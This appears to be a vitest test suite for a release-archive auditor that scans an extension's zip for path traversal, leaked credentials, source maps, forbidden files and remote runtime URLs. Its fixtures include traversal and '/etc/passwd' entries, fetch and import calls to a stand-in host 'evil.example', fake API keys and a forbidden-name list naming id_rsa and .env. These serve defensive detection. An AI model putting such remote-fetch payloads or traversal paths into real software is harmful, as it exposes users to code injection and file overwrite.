import { gzipSync } from "node:zlib";

import { TextReader, Uint8ArrayReader, Uint8ArrayWriter, ZipWriter } from "@zip.js/zip.js";
import { describe, expect, it } from "vitest";

import {
  find_first_party_emoji,
  find_font_awesome_references,
  find_legacy_runtime_references,
  find_remote_runtime_urls,
  find_runtime_asset_references,
  find_secret_matches,
  find_source_map_references,
  find_static_chunk_imports,
  is_first_party_offset,
  is_placeholder_value,
  owning_region,
} from "./content_scan.js";
import {
  audit_entries,
  crc32,
  format_report,
  is_allowed_release_path,
  normalize_locale_id,
  parse_arguments,
  read_archive_entries,
  REPORT_FIELD_ORDER,
  type ArchiveEntry,
  type AuditReport,
  type GitDistPort,
  type ReleaseFinding,
  type ReleaseRuleId,
} from "./index.js";

const EXPECTED_HELPER_VERSION = "4.9.1";

type FixtureFiles = Record<string, string | Uint8Array>;

const CLEAN_ENTRY_BUNDLE = [
  `const HELPER_VERSION = "${EXPECTED_HELPER_VERSION}";`,
  `const load_locale = () => import("./chunks/zh_cn-ABCDEF12.js");`,
  `const font_url = "__TAVERN_CANVAS_ASSET_URL__geist_variable.woff2__";`,
  `export { HELPER_VERSION, load_locale, font_url };`,
].join("\n");

function split_bundle(host_import: string): string {
  return [
    host_import,
    `const load_locale = () => import("./chunks/zh_cn-ABCDEF12.js");`,
    `const font_url = "__TAVERN_CANVAS_ASSET_URL__geist_variable.woff2__";`,
    `export { load_locale, font_url };`,
  ].join("\n");
}

const CLEAN_STYLESHEET = [
  `@font-face{font-family:Geist;src:url(__TAVERN_CANVAS_ASSET_URL__geist_variable.woff2__)format("woff2")}`,
  `.tavern-canvas-root{color:#f5f5f5}`,
].join("\n");

const CLEAN_MANIFEST = JSON.stringify(
  {
    display_name: "Tavern Canvas",
    dependencies: ["third-party/JS-Slash-Runner"],
    js: "dist/index.js",
    css: "dist/index.css",
    version: "3.0.0-alpha.1",
    homePage: "https://github.com/ITOTI-Y/tavern-canvas",
    auto_update: true,
    minimum_client_version: "1.18.0",
    minimum_tavern_helper_version: EXPECTED_HELPER_VERSION,
    i18n: { en: "i18n/en.json" },
  },
  null,
  2,
);

function clean_files(): FixtureFiles {
  return {
    "manifest.json": CLEAN_MANIFEST,
    "i18n/en.json": JSON.stringify({ app: { title: "Tavern Canvas" } }),
    "README.md": "# Tavern Canvas\n\nCRC_PROBE_MARKER\n",
    "THIRD_PARTY_NOTICES.md": "# Third party notices\n\nMIT licensed dependencies.\n",
    "dist/index.js": CLEAN_ENTRY_BUNDLE,
    "dist/index.css": CLEAN_STYLESHEET,
    "dist/geist_variable.woff2": new Uint8Array([0x77, 0x4f, 0x46, 0x32, 0x00, 0x01, 0x00, 0x00]),
    "dist/chunks/zh_cn-ABCDEF12.js": `export const zh_cn = { app: { title: "智绘姬" } };`,
    "dist/workers/vocabulary_worker.js": `self.onmessage = () => {};`,
    "dist/vocabulary/baseline/manifest.json": JSON.stringify({
      record_count: 1,
      shards: [{ shard_id: "alias:h000", path: "alias/h000.msgpack.gz" }],
    }),
    "dist/vocabulary/baseline/alias/h000.msgpack.gz": new Uint8Array([0x1f, 0x8b, 0x08, 0x00]),
  };
}

const UNIX_SYMLINK_MODE = 0o120_777;

async function build_archive(
  files: FixtureFiles,
  stored: boolean,
  symlinks: readonly string[],
): Promise<Uint8Array> {
  const writer = new ZipWriter(new Uint8ArrayWriter(), { bufferedWrite: true });
  for (const [path, content] of Object.entries(files)) {
    const reader =
      typeof content === "string" ? new TextReader(content) : new Uint8ArrayReader(content);
    await writer.add(path, reader, {
      ...(stored ? { level: 0 } : {}),
      ...(symlinks.includes(path) ? { unixMode: UNIX_SYMLINK_MODE } : {}),
    });
  }
  return writer.close();
}

const CLEAN_HISTORY = ["README.md", "manifest.json", "apps/extension/src/index.ts"];

function git_port_for(
  files: FixtureFiles,
  untracked: readonly string[],
  history: readonly string[],
): GitDistPort {
  const tracked = new Set(
    Object.keys(files).filter((path) => path.startsWith("dist/") && !untracked.includes(path)),
  );
  return {
    tracked_dist_paths: () => tracked,
    historical_paths: () => new Set(history),
    ignore_rule: (path) =>
      untracked.includes(path) ? ".gitignore:12:dist/vocabulary/" : undefined,
  };
}

interface FixtureOptions {
  readonly stored?: boolean;
  readonly symlinks?: readonly string[];
  readonly untracked?: readonly string[];
  readonly history?: readonly string[];
  readonly helper_version?: string;
  readonly patch?: (archive: Uint8Array) => void;
}

async function audit_fixture(
  files: FixtureFiles,
  options: FixtureOptions = {},
): Promise<AuditReport> {
  const archive = await build_archive(files, options.stored ?? false, options.symlinks ?? []);
  options.patch?.(archive);
  return audit_entries(await read_archive_entries(archive), archive, {
    expected_helper_version: options.helper_version ?? EXPECTED_HELPER_VERSION,
    git: git_port_for(files, options.untracked ?? [], options.history ?? CLEAN_HISTORY),
  });
}

function findings_for(report: AuditReport, rule_id: ReleaseRuleId): readonly ReleaseFinding[] {
  return report.findings.filter((finding) => finding.rule_id === rule_id);
}

function paths_for(report: AuditReport, rule_id: ReleaseRuleId): string[] {
  return findings_for(report, rule_id).map((finding) => finding.path);
}

describe("release_audit clean archive", () => {
  it("reports no findings for an archive that satisfies every rule", async () => {
    const report = await audit_fixture(clean_files());
    expect(report.findings).toEqual([]);
  });

  it("recomputes a SHA-256 over the archive and over every entry", async () => {
    const files = clean_files();
    const report = await audit_fixture(files);
    expect(report.archive_sha256).toMatch(/^[0-9a-f]{64}$/u);
    expect([...report.entry_sha256.keys()].sort()).toEqual(Object.keys(files).sort());
    for (const digest of report.entry_sha256.values()) {
      expect(digest).toMatch(/^[0-9a-f]{64}$/u);
    }
  });
});

describe("release_audit report fields", () => {
  it("prints exactly the nine mandated field names in order", async () => {
    const report = await audit_fixture(clean_files());
    const printed = format_report(report.fields)
      .split("\n")
      .map((line) => line.slice(0, line.indexOf("=")));
    expect(printed).toEqual([
      "legacy_paths",
      "remote_runtime_scripts",
      "font_awesome_references",
      "first_party_emoji",
      "manifest_dependency",
      "minimum_tavern_helper_version",
      "locale_count",
      "initial_js_gzip_bytes",
      "initial_css_gzip_bytes",
    ]);
    expect([...REPORT_FIELD_ORDER]).toEqual(printed);
  });

  it("reports the manifest dependency, helper version, and locale count of a clean archive", async () => {
    const report = await audit_fixture(clean_files());
    expect(report.fields.manifest_dependency).toBe("third-party/JS-Slash-Runner");
    expect(report.fields.minimum_tavern_helper_version).toBe(EXPECTED_HELPER_VERSION);
    expect(report.fields.locale_count).toBe(2);
    expect(report.fields.legacy_paths).toBe(0);
    expect(report.fields.remote_runtime_scripts).toBe(0);
    expect(report.fields.font_awesome_references).toBe(0);
    expect(report.fields.first_party_emoji).toBe(0);
  });
});

describe("rule 1: zip path hygiene", () => {
  it("accepts the relative POSIX paths of a clean archive", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "zip-path-hygiene")).toEqual([]);
  });

  it("flags a parent-directory traversal segment", async () => {
    const files = { ...clean_files(), "dist/../escaped.js": "export const escaped = 1;" };
    const report = await audit_fixture(files);
    expect(paths_for(report, "zip-path-hygiene")).toContain("dist/../escaped.js");
  });

  it("flags an absolute path and a non-POSIX separator", async () => {
    const files = { ...clean_files(), "/etc/passwd": "root", "dist\\windows.js": "x" };
    const report = await audit_fixture(files);
    expect(paths_for(report, "zip-path-hygiene")).toEqual(
      expect.arrayContaining(["/etc/passwd", "dist\\windows.js"]),
    );
  });

  it("flags a symlink entry", async () => {
    const files = { ...clean_files(), "dist/alias.js": "dist/index.js" };
    const report = await audit_fixture(files, { symlinks: ["dist/alias.js"] });
    const detail = findings_for(report, "zip-path-hygiene").find(
      (finding) => finding.path === "dist/alias.js",
    );
    expect(detail?.detail).toContain("symbolic link");
  });

  it("flags paths that collide on a case-insensitive filesystem", async () => {
    const files = {
      ...clean_files(),
      "dist/App.js": "export const a = 1;",
      "dist/app.js": "export const b = 2;",
    };
    const report = await audit_fixture(files);
    const detail = findings_for(report, "zip-path-hygiene").find((finding) =>
      finding.detail.includes("case-insensitive"),
    );
    expect(detail?.path).toBe("dist/app.js");
  });

  // A ZipWriter refuses to write the same filename twice, so the exact-duplicate branch is driven
  // through the entry list the reader would have produced from a hand-rolled archive.
  it("flags a duplicate entry path", () => {
    const entry: ArchiveEntry = {
      path: "dist/index.js",
      bytes: new Uint8Array(0),
      declared_crc32: crc32(new Uint8Array(0)),
      declared_uncompressed_size: 0,
      external_file_attributes: 0,
      is_directory: false,
    };
    const report = audit_entries([entry, entry], new Uint8Array(0), {
      expected_helper_version: EXPECTED_HELPER_VERSION,
      git: {
        tracked_dist_paths: () => new Set(["dist/index.js"]),
        historical_paths: () => new Set(CLEAN_HISTORY),
      },
    });
    expect(
      findings_for(report, "zip-path-hygiene").some((finding) =>
        finding.detail.includes("duplicate"),
      ),
    ).toBe(true);
  });
});

describe("rule 2: allowed paths", () => {
  it("accepts every path shape the release layout permits", async () => {
    for (const path of [
      "manifest.json",
      "README.md",
      "THIRD_PARTY_NOTICES.md",
      "CHANGELOG.md",
      "SECURITY.md",
      "i18n/zh_cn.json",
      "dist/index.js",
      "dist/chunks/zh_cn-ABCDEF12.js",
      "dist/assets/logo.svg",
    ]) {
      expect(is_allowed_release_path(path)).toBe(true);
    }
    expect(findings_for(await audit_fixture(clean_files()), "disallowed-path")).toEqual([]);
  });

  it("flags an entry outside the published layout", async () => {
    const files = { ...clean_files(), "scripts/postinstall.mjs": "console.log(1);" };
    const report = await audit_fixture(files);
    expect(paths_for(report, "disallowed-path")).toEqual(["scripts/postinstall.mjs"]);
  });

  it("flags Vite build metadata even though it lives under dist/", async () => {
    expect(is_allowed_release_path("dist/.vite/manifest.json")).toBe(false);
    const files = {
      ...clean_files(),
      "dist/.vite/manifest.json": JSON.stringify({ "src/index.ts": { file: "index.js" } }),
    };
    const report = await audit_fixture(files);
    const finding = findings_for(report, "disallowed-path")[0];
    expect(finding?.path).toBe("dist/.vite/manifest.json");
    expect(finding?.detail).toContain("Vite build metadata");
  });
});

describe("rule 3: manifest schema", () => {
  it("accepts the clean manifest", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "manifest-schema")).toEqual([]);
  });

  it("flags every violated manifest requirement", async () => {
    const files = {
      ...clean_files(),
      "manifest.json": JSON.stringify({
        display_name: "",
        dependencies: ["third-party/JS-Slash-Runner", "Other-Runner"],
        js: "index.js",
        css: "style.css",
        version: "three",
        homePage: "https://example.com/tavern-canvas",
        auto_update: false,
        minimum_client_version: "latest",
      }),
    };
    const report = await audit_fixture(files);
    const details = findings_for(report, "manifest-schema").map((finding) => finding.detail);
    expect(details).toEqual(
      expect.arrayContaining([
        expect.stringContaining("display_name"),
        expect.stringContaining("version is not a semantic version"),
        expect.stringContaining("js must point under dist/"),
        expect.stringContaining("css must point under dist/"),
        expect.stringContaining("dependencies must be exactly"),
        expect.stringContaining("auto_update"),
        expect.stringContaining("homePage"),
        expect.stringContaining("minimum_client_version"),
      ]),
    );
  });

  it("flags a manifest that is not valid JSON", async () => {
    const report = await audit_fixture({ ...clean_files(), "manifest.json": "{" });
    expect(findings_for(report, "manifest-schema")[0]?.detail).toContain("not valid JSON");
  });
});

describe("rule 4: checksums", () => {
  it("accepts entries whose stored CRC and size match their bytes", async () => {
    const report = await audit_fixture(clean_files(), { stored: true });
    expect(findings_for(report, "entry-checksum")).toEqual([]);
  });

  it("flags an entry whose bytes no longer match the stored CRC", async () => {
    const report = await audit_fixture(clean_files(), {
      stored: true,
      patch: (archive) => {
        const marker = new TextEncoder().encode("CRC_PROBE_MARKER");
        const at = Buffer.from(archive).indexOf(Buffer.from(marker));
        expect(at).toBeGreaterThan(0);
        archive.set(new TextEncoder().encode("crc_probe_marker"), at);
      },
    });
    expect(paths_for(report, "entry-checksum")).toEqual(["README.md"]);
    expect(findings_for(report, "entry-checksum")[0]?.detail).toContain("declares CRC");
  });
});

describe("rule 5: runtime file existence", () => {
  it("accepts an archive carrying every runtime-fetched file", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "missing-runtime-file")).toEqual([]);
  });

  it("flags a missing worker, a missing vocabulary shard, and a missing font asset", async () => {
    const files = clean_files();
    delete files["dist/workers/vocabulary_worker.js"];
    delete files["dist/vocabulary/baseline/alias/h000.msgpack.gz"];
    delete files["dist/geist_variable.woff2"];
    const report = await audit_fixture(files);
    expect(paths_for(report, "missing-runtime-file")).toEqual(
      expect.arrayContaining([
        "dist/workers/vocabulary_worker.js",
        "dist/vocabulary/baseline/alias/h000.msgpack.gz",
        "dist/geist_variable.woff2",
      ]),
    );
  });

  it("flags an empty extension script", async () => {
    const report = await audit_fixture({ ...clean_files(), "dist/index.js": "" });
    expect(
      findings_for(report, "missing-runtime-file").some(
        (finding) => finding.path === "dist/index.js" && finding.detail.includes("is empty"),
      ),
    ).toBe(true);
  });
});

describe("rule 6: locale count", () => {
  it("counts both launch locales in a clean archive", async () => {
    const report = await audit_fixture(clean_files());
    expect(report.fields.locale_count).toBe(2);
    expect(findings_for(report, "locale-coverage")).toEqual([]);
  });

  it("flags a missing zh-CN chunk and a locale file the manifest names", async () => {
    const files = clean_files();
    delete files["dist/chunks/zh_cn-ABCDEF12.js"];
    delete files["i18n/en.json"];
    const report = await audit_fixture(files);
    expect(report.fields.locale_count).toBe(1);
    expect(paths_for(report, "locale-coverage")).toEqual(
      expect.arrayContaining(["i18n/en.json", "i18n"]),
    );
  });

  it("normalizes locale identifiers to their BCP 47 shape", () => {
    expect(normalize_locale_id("zh_cn")).toBe("zh-CN");
    expect(normalize_locale_id("zh-CN")).toBe("zh-CN");
    expect(normalize_locale_id("en")).toBe("en");
  });
});

describe("rule 7: dependency and version gates", () => {
  it("accepts a manifest whose helper gate matches the code constant", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "version-gate")).toEqual([]);
  });

  it("flags a helper gate that drifted from the code constant", async () => {
    const files = {
      ...clean_files(),
      "manifest.json": CLEAN_MANIFEST.replace(EXPECTED_HELPER_VERSION, "4.0.0"),
      "dist/index.js": CLEAN_ENTRY_BUNDLE.replace(EXPECTED_HELPER_VERSION, "4.0.0"),
    };
    const report = await audit_fixture(files);
    const details = findings_for(report, "version-gate").map((finding) => finding.detail);
    expect(details).toEqual(
      expect.arrayContaining([
        expect.stringContaining("but the code requires 4.9.1"),
        expect.stringContaining("the initial JS asset set"),
      ]),
    );
  });

  it("accepts the gate when only a statically imported chunk carries the constant", async () => {
    const report = await audit_fixture({
      ...clean_files(),
      "dist/index.js": split_bundle(`import { HELPER_VERSION } from "./chunks/host-ABCDEF12.js";`),
      "dist/chunks/host-ABCDEF12.js": `export const HELPER_VERSION = "${EXPECTED_HELPER_VERSION}";`,
    });
    expect(findings_for(report, "version-gate")).toEqual([]);
  });

  it("flags the gate when only a dynamically imported chunk carries the constant", async () => {
    const report = await audit_fixture({
      ...clean_files(),
      "dist/index.js": split_bundle(`const load_host = () => import("./chunks/host-ABCDEF12.js");`),
      "dist/chunks/host-ABCDEF12.js": `export const HELPER_VERSION = "${EXPECTED_HELPER_VERSION}";`,
    });
    const finding = findings_for(report, "version-gate")[0];
    expect(finding?.path).toBe("dist/index.js");
    expect(finding?.detail).toContain("the initial JS asset set (dist/index.js)");
  });

  it("flags a manifest that declares no helper gate at all", async () => {
    const files = {
      ...clean_files(),
      "manifest.json": JSON.stringify({
        ...(JSON.parse(CLEAN_MANIFEST) as Record<string, unknown>),
        minimum_tavern_helper_version: undefined,
      }),
    };
    const report = await audit_fixture(files);
    expect(findings_for(report, "version-gate")[0]?.detail).toContain("no readable");
  });
});

describe("rule 8: forbidden names and content", () => {
  it("accepts a clean archive, including its gzipped vocabulary shards", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "forbidden-name")).toEqual([]);
  });

  it("flags the legacy v2 tarball, credentials, and machine metadata", async () => {
    const files = {
      ...clean_files(),
      "dist/st-chatu8-v2.8.1.tar.gz": new Uint8Array([0x1f, 0x8b]),
      "dist/.env": "TOKEN=1",
      "dist/server.pem": "cert",
      "dist/signing.key": "key",
      "dist/id_rsa": "key",
      "dist/.DS_Store": new Uint8Array([0]),
      "dist/node_modules/left-pad/index.js": "module.exports = 1;",
    };
    const report = await audit_fixture(files);
    expect(paths_for(report, "forbidden-name")).toEqual(
      expect.arrayContaining([
        "dist/st-chatu8-v2.8.1.tar.gz",
        "dist/.env",
        "dist/server.pem",
        "dist/signing.key",
        "dist/id_rsa",
        "dist/.DS_Store",
        "dist/node_modules/left-pad/index.js",
      ]),
    );
  });
});

describe("rule 9: source maps", () => {
  it("accepts a bundle with no source map reference", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "source-map")).toEqual([]);
    expect(find_source_map_references(CLEAN_ENTRY_BUNDLE)).toEqual([]);
  });

  it("flags a shipped .map entry and an inline sourceMappingURL comment", async () => {
    const files = {
      ...clean_files(),
      "dist/index.js.map": `{"version":3}`,
      "dist/index.js": `${CLEAN_ENTRY_BUNDLE}\n//# sourceMappingURL=index.js.map`,
    };
    const report = await audit_fixture(files);
    expect(paths_for(report, "source-map")).toEqual(
      expect.arrayContaining(["dist/index.js.map", "dist/index.js"]),
    );
  });
});

describe("rule 10: secret patterns", () => {
  it("ignores placeholders and template expressions", () => {
    expect(find_secret_matches(`{"api_key": ""}`)).toEqual([]);
    expect(find_secret_matches(`{"api_key": "YOUR_API_KEY"}`)).toEqual([]);
    expect(find_secret_matches("Authorization: Bearer ${access_token}")).toEqual([]);
    expect(is_placeholder_value("<token>")).toBe(true);
    expect(is_placeholder_value("xxxxxxxx")).toBe(true);
    expect(is_placeholder_value("nq7Ld8ZvQm41PpTr")).toBe(false);
  });

  it("matches every high-signal credential shape without echoing the secret", () => {
    const samples = [
      `const key = "sk-A1b2C3d4E5f6G7h8I9";`,
      `const key = "AIza0123456789abcdefghijklmnopqrstuv";`,
      `const token = "pst-0123456789abcdefghijklmno";`,
      `const token = "ghp_0123456789abcdef";`,
      `-----BEGIN RSA PRIVATE KEY-----`,
      `Authorization: Bearer nq7Ld8ZvQm41PpTrXw`,
      `{"credential": "nq7Ld8ZvQm41PpTrXw"}`,
    ];
    for (const sample of samples) {
      const matches = find_secret_matches(sample);
      expect(matches.length).toBeGreaterThan(0);
      for (const match of matches) {
        expect(match.detail).not.toContain("nq7Ld8ZvQm41PpTr");
        expect(match.detail).not.toContain("0123456789");
        expect(match.detail).toContain("pattern");
      }
    }
  });

  it("accepts a clean archive and flags a leaked key by path and byte offset", async () => {
    expect(findings_for(await audit_fixture(clean_files()), "secret-pattern")).toEqual([]);

    const leaked = `const key = "sk-A1b2C3d4E5f6G7h8I9";\n${CLEAN_ENTRY_BUNDLE}`;
    const report = await audit_fixture({ ...clean_files(), "dist/index.js": leaked });
    const finding = findings_for(report, "secret-pattern")[0];
    expect(finding?.path).toBe("dist/index.js");
    expect(finding?.detail).toContain("dist/index.js@13");
    expect(finding?.detail).not.toContain("A1b2C3d4E5f6G7h8I9");
  });
});

describe("rule 11: legacy runtime paths", () => {
  it("allows the v2 settings key inside a migration reader region", () => {
    const migration_module = [
      `//#region src/migration/legacy_sources.ts`,
      `const LEGACY_SETTINGS_KEY = "st-chatu8";`,
      `//#endregion`,
    ].join("\n");
    expect(find_legacy_runtime_references(migration_module)).toEqual([]);
    expect(owning_region(migration_module, migration_module.indexOf("st-chatu8"))).toBe(
      "src/migration/legacy_sources.ts",
    );
  });

  it("flags the v2 settings key outside a migration reader", () => {
    const matches = find_legacy_runtime_references(`const key = "st-chatu8";`);
    expect(matches).toHaveLength(1);
    expect(matches[0]?.detail).toContain("outside a migration reader");
  });

  it("flags every abandoned v2 runtime surface", async () => {
    const files = {
      ...clean_files(),
      "index.js": "// v2 monolith",
      "dist/legacy.js": [
        `import "./html/settings/index.js";`,
        `import "./utils/iframe/bridge.js";`,
        `import "./utils/settings/store.js";`,
        `loadIsolatedUmdLibrary("transformers");`,
        `showReinstallGuide();`,
        `window.chatu8 = {};`,
      ].join("\n"),
    };
    const report = await audit_fixture(files);
    expect(paths_for(report, "legacy-runtime-path")).toEqual(
      expect.arrayContaining(["index.js", "dist/legacy.js"]),
    );
    expect(report.fields.legacy_paths).toBe(7);
  });

  it("reports zero legacy paths for a clean archive", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "legacy-runtime-path")).toEqual([]);
    expect(report.fields.legacy_paths).toBe(0);
  });
});

describe("rule 12: remote runtime URLs", () => {
  it("ignores absolute URLs that are never fetched", () => {
    expect(
      find_remote_runtime_urls(`const home_page = "https://github.com/ITOTI-Y/tavern-canvas";`),
    ).toEqual([]);
    expect(
      find_remote_runtime_urls(`const ROUTES = { openai: "https://api.openai.com/v1" };`),
    ).toEqual([]);
    expect(
      find_remote_runtime_urls(`// Licensed under MIT, see https://opensource.org/licenses/MIT`),
    ).toEqual([]);
  });

  it("flags fetch contexts and banned CDN hosts", () => {
    for (const sample of [
      `fetch("https://evil.example/payload.json")`,
      `import("https://evil.example/module.js")`,
      `new Worker("https://evil.example/worker.js")`,
      `import { x } from "https://evil.example/module.js";`,
      `<script src="https://evil.example/tracker.js"></script>`,
      `@font-face{src:url(https://fonts.gstatic.com/s/geist.woff2)}`,
      `const cdn = "https://cdn.jsdelivr.net/npm/vue";`,
    ]) {
      expect(find_remote_runtime_urls(sample).length).toBeGreaterThan(0);
    }
  });

  it("counts remote runtime scripts in the report field", async () => {
    expect((await audit_fixture(clean_files())).fields.remote_runtime_scripts).toBe(0);

    const report = await audit_fixture({
      ...clean_files(),
      "dist/index.js": `${CLEAN_ENTRY_BUNDLE}\nfetch("https://cdn.jsdelivr.net/npm/vue");`,
    });
    expect(paths_for(report, "remote-runtime-url")).toEqual(["dist/index.js", "dist/index.js"]);
    expect(report.fields.remote_runtime_scripts).toBe(2);
  });
});

describe("rule 13: Font Awesome", () => {
  it("ignores hex character classes that only look like Font Awesome classes", () => {
    expect(
      find_font_awesome_references(`const uuid = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}$/u;`),
    ).toEqual([]);
  });

  it("flags Font Awesome class names and brand references", async () => {
    expect(find_font_awesome_references(`<i class="fa-solid fa-star"></i>`).length).toBe(2);
    expect(find_font_awesome_references(`/* Font Awesome Free 6 */`).length).toBe(1);

    const report = await audit_fixture({
      ...clean_files(),
      "dist/index.css": `${CLEAN_STYLESHEET}\n.fa-star{color:red}`,
    });
    expect(paths_for(report, "font-awesome")).toEqual(["dist/index.css"]);
    expect(report.fields.font_awesome_references).toBe(1);
  });
});

describe("rule 14: first-party emoji", () => {
  it("ignores emoji inside vendored bundle regions", () => {
    const bundled = [
      `//#region ../../node_modules/.pnpm/@zip.js+zip.js@2.8.34/node_modules/@zip.js/zip.js/lib/core/util/decode-cp437.js`,
      `const CP437 = "☺☻♥";`,
      `//#endregion`,
    ].join("\n");
    expect(find_first_party_emoji(bundled)).toEqual([]);
    expect(is_first_party_offset(bundled, bundled.indexOf("☺"))).toBe(false);
  });

  it("flags emoji in first-party bundle code and in locale catalogs", async () => {
    const report = await audit_fixture({
      ...clean_files(),
      "dist/index.js": `${CLEAN_ENTRY_BUNDLE}\nconst badge = "✅";`,
      "i18n/en.json": JSON.stringify({ app: { title: "Tavern Canvas ✨" } }),
    });
    expect(paths_for(report, "first-party-emoji")).toEqual(
      expect.arrayContaining(["dist/index.js", "i18n/en.json"]),
    );
    expect(report.fields.first_party_emoji).toBe(2);
  });

  it("reports zero emoji for a clean archive", async () => {
    expect((await audit_fixture(clean_files())).fields.first_party_emoji).toBe(0);
  });
});

describe("rule 15: dist/ git-tracking completeness", () => {
  it("accepts an archive whose dist/ paths are all tracked", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "dist-not-tracked")).toEqual([]);
  });

  it("flags a shipped dist/ path that git does not track, naming the ignoring rule", async () => {
    const report = await audit_fixture(clean_files(), {
      untracked: ["dist/vocabulary/baseline/alias/h000.msgpack.gz"],
    });
    const finding = findings_for(report, "dist-not-tracked")[0];
    expect(finding?.path).toBe("dist/vocabulary/baseline/alias/h000.msgpack.gz");
    expect(finding?.detail).toContain(".gitignore:12:dist/vocabulary/");
  });
});

describe("rule 17: legacy history", () => {
  it("reports nothing for a history that only ever added first-party sources", async () => {
    const report = await audit_fixture(clean_files());
    expect(findings_for(report, "legacy-history")).toEqual([]);
  });

  it("flags a legacy source archive that any commit ever added", async () => {
    const report = await audit_fixture(clean_files(), {
      history: [
        ...CLEAN_HISTORY,
        "data/_archive/raw_st_chatu8_v2_8_1_20260804.tar.gz",
        "index.js",
        "vendor/bundle.zip",
      ],
    });
    expect(paths_for(report, "legacy-history")).toEqual([
      "data/_archive/raw_st_chatu8_v2_8_1_20260804.tar.gz",
      "data/_archive/raw_st_chatu8_v2_8_1_20260804.tar.gz",
      "index.js",
      "vendor/bundle.zip",
    ]);
    expect(findings_for(report, "legacy-history")[2]?.detail).toContain("v2 root monolith");
  });
});

describe("rule 16: bundle budget fields", () => {
  it("counts only the entry bundle when every chunk is imported dynamically", async () => {
    const report = await audit_fixture(clean_files());
    expect(find_static_chunk_imports(CLEAN_ENTRY_BUNDLE)).toEqual([]);
    expect(report.fields.initial_js_gzip_bytes).toBe(
      gzipSync(Buffer.from(CLEAN_ENTRY_BUNDLE), { level: 9 }).byteLength,
    );
    expect(report.fields.initial_css_gzip_bytes).toBe(
      gzipSync(Buffer.from(CLEAN_STYLESHEET), { level: 9 }).byteLength,
    );
    expect(findings_for(report, "bundle-budget-input")).toEqual([]);
  });

  it("adds statically imported chunks to the initial JS figure", async () => {
    const files = clean_files();
    const chunk = files["dist/chunks/zh_cn-ABCDEF12.js"];
    const static_bundle = CLEAN_ENTRY_BUNDLE.replace(
      `import("./chunks/zh_cn-ABCDEF12.js")`,
      `zh_cn`,
    ).concat(`\nimport { zh_cn } from "./chunks/zh_cn-ABCDEF12.js";`);
    expect(find_static_chunk_imports(static_bundle)).toEqual(["chunks/zh_cn-ABCDEF12.js"]);

    const report = await audit_fixture({ ...files, "dist/index.js": static_bundle });
    expect(report.fields.initial_js_gzip_bytes).toBe(
      gzipSync(Buffer.from(static_bundle), { level: 9 }).byteLength +
        gzipSync(Buffer.from(chunk as string), { level: 9 }).byteLength,
    );
  });

  it("flags a statically imported chunk that is missing from the archive", async () => {
    const files = clean_files();
    delete files["dist/chunks/zh_cn-ABCDEF12.js"];
    const report = await audit_fixture({
      ...files,
      "dist/index.js": `import { zh_cn } from "./chunks/zh_cn-ABCDEF12.js";\n${CLEAN_ENTRY_BUNDLE}`,
    });
    expect(paths_for(report, "bundle-budget-input")).toEqual(["dist/chunks/zh_cn-ABCDEF12.js"]);
  });
});

describe("release_audit helpers", () => {
  it("extracts the runtime asset references a bundle declares", () => {
    expect(find_runtime_asset_references(CLEAN_STYLESHEET)).toEqual(["geist_variable.woff2"]);
    // The bundle also carries the runtime's own marker regex; a regex source is not an asset path.
    expect(find_runtime_asset_references(`/__TAVERN_CANVAS_ASSET_URL__(.*?)__/gu`)).toEqual([]);
  });

  it("parses the command line", () => {
    expect(parse_arguments(["release.zip"])).toEqual({
      archive_path: "release.zip",
      repository_root: undefined,
      history_ref: undefined,
    });
    expect(
      parse_arguments(["--repository-root", "/repo", "--history-ref", "main", "release.zip"]),
    ).toEqual({
      archive_path: "release.zip",
      repository_root: "/repo",
      history_ref: "main",
    });
    expect(() => parse_arguments([])).toThrow(/Usage/u);
  });

  it("computes a CRC-32 that matches the reference vector", () => {
    expect(crc32(new TextEncoder().encode("123456789"))).toBe(0xcb_f4_39_26);
  });
});
